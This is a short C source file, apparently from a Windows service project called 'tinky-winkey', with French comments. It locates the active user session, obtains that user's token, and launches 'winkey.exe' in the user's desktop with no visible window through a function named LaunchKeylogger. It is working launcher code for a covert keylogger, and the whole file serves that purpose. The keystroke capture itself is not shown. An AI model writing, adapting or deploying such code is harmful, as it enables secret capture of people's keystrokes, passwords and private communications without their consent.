#include "svc.h"

/**
 * Cette fonction sert a trouver la session active, c'est a dire celle connectee au clavier + souris.
 */
DWORD GetActiveSessionId(void)
{
    WTS_SESSION_INFOA *sessionInfos;
    DWORD nbOfSessions;
    DWORD activeSession = 0;
    BOOL sessions = WTSEnumerateSessionsA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &sessionInfos, &nbOfSessions);
    if (sessions == FALSE)
    {
        log("WTSEnumerateSessionsA failed.\n");
        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
        exit(1);
    }
    for (DWORD i = 0; i != nbOfSessions; ++i)
    {
        if (sessionInfos[i].State == WTSActive)
        {
            activeSession = sessionInfos[i].SessionId;
            break;
        }
    }
    WTSFreeMemory(sessionInfos);    
    return activeSession;
}

VOID LaunchKeylogger(LPPROCESS_INFORMATION keylogInfo)
{
    DWORD activeSessionId = GetActiveSessionId();
    if (activeSessionId == 0)
    {
        log("GetActiveSessionId failed.\n");
        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
        exit(1);
    }
    char cwd[MAX_PATH];
    GetCurrentDirectory((DWORD)MAX_PATH, (LPSTR)&cwd);
    STARTUPINFO sa = {0};
    HANDLE activeUserToken;
    BOOL res = WTSQueryUserToken(activeSessionId, &activeUserToken);
    if (res == FALSE)
    {
        log("WTSQueryUserToken failed.\n");
        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
        exit(1);
    }
    res =  CreateProcessAsUserA(activeUserToken, "C:\\Users\\Administrateur\\Documents\\tinky-winkey\\winkey.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW, NULL, NULL, &sa, keylogInfo);
    if (res == FALSE)
    {
        PrintError();
        log("CreateProcessAsUserA failed.\n");
        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
        exit(1);
    }
}
